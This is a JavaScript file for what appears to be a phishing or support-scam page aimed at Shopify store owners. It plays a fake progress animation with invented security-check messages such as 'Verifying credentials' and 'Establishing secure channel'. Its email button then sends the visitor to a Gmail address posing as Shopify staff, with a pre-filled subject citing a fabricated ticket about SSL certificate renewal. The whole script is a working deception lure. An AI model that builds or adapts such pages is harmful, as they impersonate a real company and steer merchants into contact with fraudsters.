document.addEventListener('DOMContentLoaded', function () {
    const progressBar = document.getElementById('progress-bar');
    const progressText = document.getElementById('progress-text');
    const loadingContainer = document.getElementById('loading-container');
    const advisorContainer = document.getElementById('advisor-container');
    const statusMessage = document.getElementById('status-message');
    const emailBtn = document.getElementById('email-btn');
    const demoBtn = document.getElementById('demo-btn');

    const statusMessages = [
        'Initializing secure connection...',
        'Verifying credentials...',
        'Analyzing compliance history...',
        'Checking partner records...',
        'Validating ticket details...',
        'Optimizing connection...',
        'Finalizing security checks...',
        'Establishing secure channel...',
        'Connection established successfully!',
    ];

    let progress = 0;
    let currentStatus = 0;
    let progressInterval;
    let statusInterval;

    function startLoading() {
        progress = 0;
        currentStatus = 0;

        progressBar.style.width = '0%';
        progressText.textContent = 'Initializing...';
        statusMessage.textContent = statusMessages[0];

        loadingContainer.classList.remove('hidden');
        loadingContainer.style.opacity = '1';
        loadingContainer.style.transform = 'scale(1)';
        advisorContainer.classList.add('hidden');
        advisorContainer.classList.remove('show');

        progressInterval = setInterval(() => {
            progress += Math.random() * 2.5 + 1.5;

            if (progress > 100) progress = 100;

            progressBar.style.width = progress + '%';
            progressText.textContent = Math.floor(progress) + '% Complete';

            if (progress >= 100) {
                clearInterval(progressInterval);
                progressText.textContent = 'Connection Established!';

                setTimeout(() => {
                    loadingContainer.style.opacity = '0';
                    loadingContainer.style.transform = 'scale(0.95)';

                    setTimeout(() => {
                        loadingContainer.classList.add('hidden');
                        advisorContainer.classList.remove('hidden');

                        setTimeout(() => {
                            advisorContainer.classList.add('show');
                        }, 50);
                    }, 300);
                }, 1000);
            }
        }, 180);

        statusInterval = setInterval(() => {
            if (currentStatus < statusMessages.length - 1) {
                currentStatus++;
                statusMessage.textContent = statusMessages[currentStatus];
                statusMessage.style.animation = 'none';
                setTimeout(() => {
                    statusMessage.style.animation = 'fadeInOut 2s ease-in-out';
                }, 10);
            }

            if (progress >= 100) {
                clearInterval(statusInterval);
            }
        }, 900);
    }

    emailBtn.addEventListener('click', function () {
        const email = 'mayahartfromshopify@gmail.com';
        const subject = 'Case Review - Ticket #SSL-SHP00739';
        const body =
            'Hello Maya,\n\nI was directed here to resolve an issue regarding the SSL Certificate Renewal for my store.\n\nBest regards,\n[Your Name]';

        const isMobile =
            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                navigator.userAgent
            );

        this.innerHTML =
            '<i class="fas fa-spinner fa-spin" style="margin-right: 0.625rem;"></i> Opening...';
        this.style.opacity = '0.8';

        setTimeout(() => {
            if (isMobile) {
                window.location.href = `mailto:${email}?subject=${encodeURIComponent(
                    subject
                )}&body=${encodeURIComponent(body)}`;
            } else {
                window.open(
                    `https://mail.google.com/mail/?view=cm&fs=1&to=${email}&su=${encodeURIComponent(
                        subject
                    )}&body=${encodeURIComponent(body)}`,
                    '_blank'
                );
            }

            setTimeout(() => {
                this.innerHTML =
                    '<i class="fas fa-envelope" style="margin-right: 0.625rem;"></i> Connect via Email';
                this.style.opacity = '1';
            }, 1000);
        }, 500);
    });

    // Start loading on page load
    startLoading();
});
